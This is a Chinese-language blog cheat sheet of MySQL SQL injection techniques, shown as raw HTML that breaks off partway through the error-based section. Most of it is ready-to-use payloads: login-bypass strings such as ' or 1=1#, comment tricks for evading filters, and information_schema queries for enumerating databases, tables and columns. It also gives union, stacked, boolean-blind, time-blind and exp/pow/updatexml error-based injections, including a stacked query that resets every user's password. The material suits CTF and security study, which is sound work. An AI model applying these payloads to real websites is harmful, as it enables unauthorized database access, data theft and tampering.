<!doctype html><html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta><title>SQL注入总结(MySQL) - CSHF</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="CSHF"><meta name="msapplication-TileImage" content="/img/logo.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="CSHF"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="常用信息测试 payload(万能密码)其中单引号都可用换成双引号 123456789admin&amp;amp;#x27; --admin&amp;amp;#x27; #admin&amp;amp;#x27;\&amp;#x2F;*1&amp;amp;#x27; or 1&amp;#x3D;1#1&amp;amp;#x27; or 1&amp;#x3D;1--1&amp;amp;#x27; or 1&amp;#x3D;1&amp;#x2F;*&amp;amp;#x27;) or &amp;amp;#x27;1&amp;amp;#x27;&amp;#x3D;&amp;amp;#x27;1&amp;amp;#x27;) or (&amp;amp;#x27;1&amp;amp;#x27;&amp;#x3D;&amp;amp;#x27;1&amp;amp;#x2"><meta property="og:type" content="blog"><meta property="og:title" content="SQL注入总结(MySQL)"><meta property="og:url" content="http://blog.cshf.xyz/2021/05/16/SQL_Inject/"><meta property="og:site_name" content="CSHF"><meta property="og:description" content="常用信息测试 payload(万能密码)其中单引号都可用换成双引号 123456789admin&amp;amp;#x27; --admin&amp;amp;#x27; #admin&amp;amp;#x27;\&amp;#x2F;*1&amp;amp;#x27; or 1&amp;#x3D;1#1&amp;amp;#x27; or 1&amp;#x3D;1--1&amp;amp;#x27; or 1&amp;#x3D;1&amp;#x2F;*&amp;amp;#x27;) or &amp;amp;#x27;1&amp;amp;#x27;&amp;#x3D;&amp;amp;#x27;1&amp;amp;#x27;) or (&amp;amp;#x27;1&amp;amp;#x27;&amp;#x3D;&amp;amp;#x27;1&amp;amp;#x2"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://blog.cshf.xyz/2021/05/16/SQL_Inject/1.png"><meta property="article:published_time" content="2021-05-16T11:56:48.000Z"><meta property="article:modified_time" content="2021-06-08T01:14:44.599Z"><meta property="article:author" content="CSHF"><meta property="article:tag" content="SQL"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/2021/05/16/SQL_Inject/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.cshf.xyz/2021/05/16/SQL_Inject/"},"headline":"CSHF","image":["http://blog.cshf.xyz/2021/05/16/SQL_Inject/1.png"],"datePublished":"2021-05-16T11:56:48.000Z","dateModified":"2021-06-08T01:14:44.599Z","author":{"@type":"Person","name":"CSHF"},"description":"常用信息测试 payload(万能密码)其中单引号都可用换成双引号 123456789admin&amp;#x27; --admin&amp;#x27; #admin&amp;#x27;\\&#x2F;*1&amp;#x27; or 1&#x3D;1#1&amp;#x27; or 1&#x3D;1--1&amp;#x27; or 1&#x3D;1&#x2F;*&amp;#x27;) or &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1&amp;#x27;) or (&amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1&amp;#x2"}</script><link rel="canonical" href="http://blog.cshf.xyz/2021/05/16/SQL_Inject/"><link rel="icon" href="/img/logo.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?f72d939143c49eed016fe7d2b8d84b57";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-67FMB9X7MP" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-67FMB9X7MP")</script><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/CSHF_LOGO.png" alt="CSHF" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/CSHF-yhhhh"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time datetime="2021-05-16T11:56:48.000Z" title="2021/5/16 下午7:56:48">2021-05-16</time>发表</span><span class="level-item"><time datetime="2021-06-08T01:14:44.599Z" title="2021/6/8 上午9:14:44">2021-06-08</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Note/">Note</a><span> / </span><a class="link-muted" href="/categories/Note/SQL/">SQL</a></span><span class="level-item">24 分钟读完 (大约3600个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">SQL注入总结(MySQL)</h1><div class="content"><h1 id="常用信息"><a href="#常用信息" class="headerlink" title="常用信息"></a>常用信息</h1><h2 id="测试-payload-万能密码"><a href="#测试-payload-万能密码" class="headerlink" title="测试 payload(万能密码)"></a>测试 payload(万能密码)</h2><p>其中单引号都可用换成双引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; --</span></span><br><span class="line"><span class="string">admin&#x27;</span> #</span><br><span class="line">admin<span class="string">&#x27;\/*</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#x27;) or &#x27;1&#x27;=&#x27;1</span></span><br><span class="line"><span class="comment">&#x27;) or (&#x27;1&#x27;=&#x27;1</span></span><br><span class="line"><span class="comment">&#x27;1 or &#x27;1</span></span><br></pre></td></tr></table></figure><h2 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- x#注意--后有一个空格, x为任意字符</span></span><br><span class="line">#</span><br><span class="line"><span class="comment">/**/</span> # 多行注释,可以用来绕过空格过滤</span><br><span class="line"><span class="comment">/*! */</span> # MYSQL特有</span><br><span class="line">;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h2><div class="table-overflow"><table><thead><tr><th align="left">运算符</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>||</code></td><td align="left">或,同<code>or</code></td></tr><tr><td align="left"><code>&amp;&amp;</code></td><td align="left">与,同<code>and</code></td></tr><tr><td align="left"><code>!</code></td><td align="left">非,同<code>not</code></td></tr><tr><td align="left"><code>^</code></td><td align="left">异或,同<code>xor</code></td></tr><tr><td align="left"><code>&amp;</code></td><td align="left">按位与</td></tr><tr><td align="left"><code>|</code></td><td align="left">按位或</td></tr><tr><td align="left"><code>&lt;&lt;</code></td><td align="left">按位左移</td></tr><tr><td align="left"><code>&gt;&gt;</code></td><td align="left">按位右移</td></tr><tr><td align="left"><code>~</code></td><td align="left">按位取反</td></tr><tr><td align="left"><code>+</code></td><td align="left">加, 可代替空格</td></tr><tr><td align="left"><code>-</code></td><td align="left">减</td></tr><tr><td align="left"><code>*</code></td><td align="left">乘</td></tr><tr><td align="left"><code>/</code></td><td align="left">除</td></tr><tr><td align="left"><code>%</code></td><td align="left">取余,同<code>MOD</code></td></tr><tr><td align="left"><code>=</code></td><td align="left">等于</td></tr><tr><td align="left"><code>&lt;&gt;</code> <code>!=</code></td><td align="left">不等于</td></tr><tr><td align="left"><code>&lt;</code></td><td align="left">小于</td></tr><tr><td align="left"><code>&gt;</code></td><td align="left">大于</td></tr><tr><td align="left"><code>&lt;=</code></td><td align="left">小于等于</td></tr><tr><td align="left"><code>&gt;=</code></td><td align="left">大于等于</td></tr><tr><td align="left"><code>BETWEEN</code></td><td align="left">在两值之间</td></tr><tr><td align="left"><code>NOT BETWEEN</code></td><td align="left">不在两值之间</td></tr><tr><td align="left"><code>IN</code></td><td align="left">在集合中</td></tr><tr><td align="left"><code>NOT IN</code></td><td align="left">不在集合中</td></tr><tr><td align="left"><code>&lt;=&gt;</code></td><td align="left">两个操作码均为 NULL 时, 其所得值为 1；而当一个操作码为 NULL 时, 其所得值为 0</td></tr><tr><td align="left"><code>LIKE</code></td><td align="left">模糊匹配</td></tr><tr><td align="left"><code>REGEXP</code> <code>RLIKE</code></td><td align="left">正则式匹配</td></tr><tr><td align="left"><code>IS NULL</code></td><td align="left">为空</td></tr><tr><td align="left"><code>IS NOT NULL</code></td><td align="left">不为空</td></tr></tbody></table></div><p><img src="/2021/05/16/SQL_Inject/1.png" alt="运算符的优先级"></p><h2 id="常用函数和语句"><a href="#常用函数和语句" class="headerlink" title="常用函数和语句"></a>常用函数和语句</h2><div class="table-overflow"><table><thead><tr><th align="left">函数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">user()</td><td align="left">当前用户名</td></tr><tr><td align="left">database()</td><td align="left">当前数据库名</td></tr><tr><td align="left">current_user()</td><td align="left">当前用户,可用来查看权限</td></tr><tr><td align="left">version()</td><td align="left">数据库版本</td></tr><tr><td align="left">@@datadir</td><td align="left">数据库的路径</td></tr><tr><td align="left">load_file()</td><td align="left">读文件操作</td></tr><tr><td align="left">into outfile()/into dumpfile</td><td align="left">写文件操作</td></tr><tr><td align="left">LENGTH(str)</td><td align="left">返回字符串的长度.</td></tr><tr><td align="left">PI()</td><td align="left">返回 π 的具体数值.</td></tr><tr><td align="left">REGEXP “statement”</td><td align="left">正则匹配数据, 返回值为布尔值.</td></tr><tr><td align="left">LIKE “statement”</td><td align="left">匹配数据, %代表任意内容. 返回值为布尔值.</td></tr><tr><td align="left">RLIKE “statement”</td><td align="left">与 regexp 相同.</td></tr><tr><td align="left">LOCATE(substr,str,[pos])</td><td align="left">返回子字符串第一次出现的位置.</td></tr><tr><td align="left">POSITION(substr IN str)</td><td align="left">等同于 LOCATE().</td></tr><tr><td align="left">LOWER(str)</td><td align="left">将字符串的大写字母全部转成小写. 同：LCASE(str).</td></tr><tr><td align="left">UPPER(str)</td><td align="left">将字符串的小写字母全部转成大写. 同：UCASE(str).</td></tr><tr><td align="left">ELT(N,str1,str2,str3,…)</td><td align="left">与 MAKE_SET(bit,str1,str2…)类似, 根据 N 返回参数值.</td></tr><tr><td align="left">NULLIF(expr1,expr2)</td><td align="left">若 expr1 与 expr2 相同, 则返回 expr1, 否则返回 NULL.</td></tr><tr><td align="left">CHARSET(str)</td><td align="left">返回字符串使用的字符集.</td></tr><tr><td align="left">DECODE(crypt_str,pass_str)</td><td align="left">使用 pass_str 作为密码, 解密加密字符串 crypt_str. 加密函数：ENCODE(str,pass_str).</td></tr></tbody></table></div><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><div class="table-overflow"><table><thead><tr><th align="left">函数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">SUBSTR(str,N_start,N_length)</td><td align="left">对指定字符串进行截取，为 SUBSTRING 的简单版。</td></tr><tr><td align="left">SUBSTRING()</td><td align="left">多种格式 SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)。</td></tr><tr><td align="left">RIGHT(str,len)</td><td align="left">对指定字符串从最右边截取指定长度。</td></tr><tr><td align="left">LEFT(str,len)</td><td align="left">对指定字符串从最左边截取指定长度。</td></tr><tr><td align="left">RPAD(str,len,padstr)</td><td align="left">在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。</td></tr><tr><td align="left">LPAD(str,len,padstr)</td><td align="left">与 RPAD 相似，在 str 左边补齐。</td></tr><tr><td align="left">MID(str,pos,len)</td><td align="left">同于 SUBSTRING(str,pos,len)。</td></tr><tr><td align="left">INSERT(str,pos,len,newstr)</td><td align="left">在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。</td></tr><tr><td align="left">CONCAT(str1,str2…)</td><td align="left">函数用于将多个字符串合并为一个字符串</td></tr><tr><td align="left">GROUP_CONCAT(…)</td><td align="left">返回一个字符串结果，该结果由分组中的值连接组合而成。</td></tr><tr><td align="left">MAKE_SET(bits,str1,str2,…)</td><td align="left">根据参数 1，返回所输入其他的参数值。可用作布尔盲注，如：EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,’1’,’710’))。</td></tr></tbody></table></div><hr><h1 id="数据库信息的获取"><a href="#数据库信息的获取" class="headerlink" title="数据库信息的获取"></a>数据库信息的获取</h1><h2 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查看当前数据库</span><br><span class="line"><span class="keyword">SELECT</span> database();</span><br><span class="line"></span><br><span class="line">#查看所有数据库</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">FROM</span> information_schema.schemata;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> sys.schema_table_statistics <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_schema;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> sys.x$schema_flattened_keys <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_schema;</span><br><span class="line"></span><br><span class="line">#通过不存在的函数名.可能可以得到数据库名</span><br><span class="line"><span class="keyword">SELECT</span> a();</span><br></pre></td></tr></table></figure><h2 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查看指定数据库的表名</span><br><span class="line"><span class="keyword">SELECT</span> grouop_concat(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database()  </span><br><span class="line"><span class="keyword">SELECT</span> GROUP_concat(table_name) <span class="keyword">FROM</span> mysql.innodb_table_stats <span class="keyword">WHERE</span> database_name<span class="operator">=</span>database()  </span><br><span class="line"></span><br><span class="line"># 查询被访问过的表</span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> sys.schema_table_statistics <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;mspwd&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_name;  </span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> sys.x$schema_flattened_keys <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;mspwd&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_name;  </span><br></pre></td></tr></table></figure><h2 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#通过预定义的分析诊断工具, 在执行完语句后加上即可</span><br><span class="line"><span class="keyword">procedure</span> analyse() #如:<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `users` <span class="keyword">procedure</span> analyse()</span><br><span class="line"></span><br><span class="line"># 查询指定表的列名</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_concat(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> 表名;</span><br><span class="line"></span><br><span class="line"># 通过比较数据大小,获得表中的数据</span><br><span class="line"><span class="keyword">SELECT</span> ((<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="string">&#x27;Dumb&#x27;</span>,&quot;Dum&quot;)<span class="operator">&gt;</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">#通过<span class="keyword">join</span>后出现相同列名,报错查看其他列名</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `users` <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b)c  </span><br><span class="line"><span class="comment">/*注: 执行完上面语句后,会提示 Duplicate column name &#x27;id&#x27; 这就是第一列的列名  </span></span><br><span class="line"><span class="comment">得到第一列列名后,通过 using 声明内连接来避免报错, 执行下面语句后,得出第二列列名,以此类推  </span></span><br><span class="line"><span class="comment">SELECT * FROM `users` union SELECT * FROM (SELECT * FROM users as a join users b using(id))c  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">#猜列名</span><br><span class="line"><span class="keyword">and</span> 列名 <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line"><span class="keyword">and</span> substr(列名,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a</span></span><br></pre></td></tr></table></figure><h2 id="表中的数据"><a href="#表中的数据" class="headerlink" title="表中的数据"></a>表中的数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询表中的指定列数据(其中的`<span class="number">1</span>`即为第几列)</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_concat(`<span class="number">1</span>`) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users)x;</span><br></pre></td></tr></table></figure><h2 id="查询连接过数据库的所有-IP-和其连接过的总次数"><a href="#查询连接过数据库的所有-IP-和其连接过的总次数" class="headerlink" title="查询连接过数据库的所有 IP 和其连接过的总次数"></a>查询连接过数据库的所有 IP 和其连接过的总次数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> host,total_connections <span class="keyword">FROM</span> sys.host_summary;</span><br></pre></td></tr></table></figure><h2 id="查看-SQL-语句执行的记录"><a href="#查看-SQL-语句执行的记录" class="headerlink" title="查看 SQL 语句执行的记录"></a>查看 SQL 语句执行的记录</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sys.x$statement_analysis;</span><br></pre></td></tr></table></figure><hr><h1 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h1><h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>基本步骤:<br><code>[1]猜语句结构并闭合--&gt;[2]猜查询字段数--&gt;[3]拼接查询语句</code></p><ul><li><h5 id="猜查询字段数方法"><a href="#猜查询字段数方法" class="headerlink" title="猜查询字段数方法"></a>猜查询字段数方法</h5></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#若实际查询列数大于, 则页面错误<span class="operator">/</span>无内容, 若小于或等于, 则页面正常</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 第几列</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 第几列</span><br><span class="line"></span><br><span class="line">#使用<span class="keyword">union</span>, <span class="keyword">union</span> <span class="keyword">SELECT</span>几列成功,就有几列数据</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,x...</span><br><span class="line"></span><br><span class="line">#使用limit 获得查询列数,有几列就几个@, 如果不一致则报错</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">desc</span> limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">into</span> @,@,@</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>可以用 <code>;</code> 来结束语句,并执行其他语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库相关信息</span><br><span class="line">;<span class="keyword">show</span> databases;</span><br><span class="line">;<span class="keyword">show</span> tables;</span><br><span class="line">;<span class="keyword">show</span> columns <span class="keyword">FROM</span> 表名;</span><br><span class="line"></span><br><span class="line">#更新数据</span><br><span class="line">;update users <span class="keyword">set</span> password<span class="operator">=</span>&quot;123456&quot; <span class="keyword">WHERE</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">#预处理语句</span><br><span class="line">;<span class="keyword">PREPARE</span> hack <span class="keyword">FROM</span> &quot;要执行的sql语句的字符串(可以为16进制、char组成的字符串等)&quot;;<span class="keyword">EXECUTE</span> hack;#</span><br><span class="line">;<span class="keyword">SET</span> <span class="variable">@hacksql</span> <span class="operator">=</span> &quot;要执行的sql语句的字符串(可以为16进制、char组成的字符串等)&quot;;<span class="keyword">PREPARE</span> hack <span class="keyword">FROM</span> <span class="variable">@hacksql</span>;<span class="keyword">EXECUTE</span> hack;#</span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><pre><code>对真或假条件返回的内容容易区分时使用
</code></pre><p>常用 payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#让前面的语句为假,判断后面的语句</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">128</span>,<span class="number">1</span>,<span class="number">0</span>);#</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">128</span>; #</span><br><span class="line"># 如果注释符被过滤, 可以类似与这样改</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">128</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><pre><code>对真或假条件返回的内容难区分时使用
</code></pre><p>常用 payload(可以发现只是在 bool 盲注的基础上,使语句成功时等待一段时间)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#让前面的语句为假,判断后面的语句</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">128</span>,sleep(<span class="number">3</span>),<span class="number">0</span>);#</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">128</span> <span class="keyword">and</span> sleep(<span class="number">3</span>) #</span><br><span class="line"># 如果注释符被过滤, 可以类似与这样改</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">128</span> <span class="keyword">and</span> sleep(<span class="number">3</span>)<span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><pre><code>在执行错误语句时,会输出报错信息
</code></pre><ul><li><h5 id="exp-报错"><a href="#exp-报错" class="headerlink" title="exp 报错"></a>exp 报错</h5>exp 参数很大时,会产生报错信息<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure></li><li><h5 id="pow-报错"><a href="#pow-报错" class="headerlink" title="pow 报错"></a>pow 报错</h5>原理同 exp<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pow(<span class="operator">~</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">user</span>())a),<span class="number">9999</span>);</span><br></pre></td></tr></table></figure></li><li><h5 id="updatexml-报错"><a href="#updatexml-报错" class="headerlink" title="updatexml 报错"></a>updatexml 报错</h5>updatexml 是由于参数的格式不正确而产生的错误<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span 